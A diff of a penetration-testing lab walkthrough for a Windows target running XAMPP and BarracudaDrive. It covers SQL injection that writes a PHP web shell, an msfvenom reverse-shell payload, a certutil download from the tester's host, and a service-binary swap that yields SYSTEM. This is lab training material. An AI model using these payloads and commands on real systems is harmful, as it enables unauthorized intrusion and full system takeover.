@@ -22,6 +22,7 @@ IP: 192.168.114.127
 ## Used tools
 - nmap
 - rustscan
+- feroxbuster
 
 ---
 
@@ -389,11 +390,11 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "feroxbuster -u http://192.168.114.127:45332/ -C 401 403 405 -x php,txt,json,docx,html" and found phpinfo.php file:
 
-![](Pasted%20image%2020221020170419.png)
+![](Images/Pasted%20image%2020221020170419.png)
 
 #### -Navigated to "http://192.168.114.127:45332/phpinfo.php" and found the root directory of the machine is "C:/xampp/htdocs"
 
-![](Pasted%20image%2020221020170505.png)
+![](Images/Pasted%20image%2020221020170505.png)
 #phpinfo #WebRootDirectoryFindings
 
 
@@ -401,46 +402,46 @@ Enumerated top 200 UDP ports:
 
 #### - Navigated to "http://192.168.114.127:44330" and was directed to the following webpage:
 
-![](Pasted%20image%2020221020170735.png)
+![](Images/Pasted%20image%2020221020170735.png)
 
 #### - Googled "BarracudaDrive exploit" and found the following local privilege escalation exploit:
 
-![](Pasted%20image%2020221020170824.png)
+![](Images/Pasted%20image%2020221020170824.png)
 
 ## PORT 33033
 
 #### - Navigated to "http://192.168.114.127:33033" and found the following web page with team names, emails and pictures:
 
-![](Pasted%20image%2020221020170955.png)
+![](Images/Pasted%20image%2020221020170955.png)
 
 #### - Found a picture of a cat in the team to be interesting:
 
-![](Pasted%20image%2020221020171034.png)
+![](Images/Pasted%20image%2020221020171034.png)
 
 #### - Clicked on the login link and was directed the following login page:
 
-![](Pasted%20image%2020221020171114.png)
+![](Images/Pasted%20image%2020221020171114.png)
 
 
-![](Pasted%20image%2020221020183042.png)
+![](Images/Pasted%20image%2020221020183042.png)
 
-#### -Clicked on the "forgot password" link and wa directed to the following page:
+#### -Clicked on the "forgot password" link and was directed to the following page:
 
-![](Pasted%20image%2020221020183337.png)
+![](Images/Pasted%20image%2020221020183337.png)
 
 #### - As the picture of the cat listed in the team was most odd I attempted multiple username and reminder alternatives found in the cats profile information and finally was able to find the correct username and reminder combination (username: jerren.devops reminder: paranoid):
 
-![](Pasted%20image%2020221020183427.png)
+![](Images/Pasted%20image%2020221020183427.png)
 
-![](Pasted%20image%2020221020183508.png)
+![](Images/Pasted%20image%2020221020183508.png)
 
 #### - Logged into the webpage with the username jerren.devops and the new created password "password" and was directed to the following web page:
 
-![](Pasted%20image%2020221020183555.png)
+![](Images/Pasted%20image%2020221020183555.png)
 
 #### - Clicked "edit" link and was directed to the following web page and clicked "Request profile SLUG" link:
 
-![](Pasted%20image%2020221020183649.png)
+![](Images/Pasted%20image%2020221020183649.png)
 
 
 ---
@@ -450,14 +451,14 @@ Enumerated top 200 UDP ports:
 
 #### - Found mysql on the page so I typed one quote and clicked request to confirm if it might be vulernable to sql injection:
 
-![](Pasted%20image%2020221020191855.png)
+![](Images/Pasted%20image%2020221020191855.png)
 
-![](Pasted%20image%2020221020191917.png)
+![](Images/Pasted%20image%2020221020191917.png)
 
 #### - Received an error showing it was vulnerable and has sql database running:
 
 
-![](Pasted%20image%2020221020192000.png)
+![](Images/Pasted%20image%2020221020192000.png)
 #sqlinjection 
 
 #### -As we confirmed previously the root directory of the target machine is "C:/xampp/htdocs" I typed ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -' and request 
@@ -470,7 +471,7 @@ Enumerated top 200 UDP ports:
 
 #### - Navigated to "192.168.114.127:45332/cmd.php?cmd=whoami" and confirmed we have remote code execution on the target machine
 
-![](Pasted%20image%2020221020192543.png)
+![](Images/Pasted%20image%2020221020192543.png)
 
 #### - Hosted the rev.exe binary on my kali machine with python
 
@@ -478,7 +479,7 @@ Enumerated top 200 UDP ports:
 
 #### - Typed rev.exe to execute the reverse shell binary and received a shell back:
 
-![](Pasted%20image%2020221020192820.png)
+![](Images/Pasted%20image%2020221020192820.png)
 
 ---
 
@@ -489,7 +490,18 @@ Enumerated top 200 UDP ports:
 
 #### - Navigated to the privilege escalation exploit found previously:
 
+![](Images/Pasted%20image%2020221020193237.png)
+
 ## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+
+#### - Instead of creating an admin user via the compiled binary steps shown in the exploit I performed the following steps:
+
+- Typed "msfvenom -p windows/x64/shell_reverse_tcp -f exe -o bd.exe LHOST=192.168.49.114 LPORT=45332" to create a reverse shell binary on my kali machine
+- Hosted the reverse shell binary on my Kali machine
+- Started a netcat listener on port 45332 listening on my kali machine
+- Typed "certutil.exe -urlcache -split -f "http://192.168.49.114:85/bd.exe" to download the reverse shell binary onto the target machine into the "C:\bd" directory to replace the already present bd.exe
+- Typed "shutdown -r" and waited a minute and received a reverse shell running as nt authority\system:
+
+![](Images/Pasted%20image%2020221020193334.png)
 
 ---
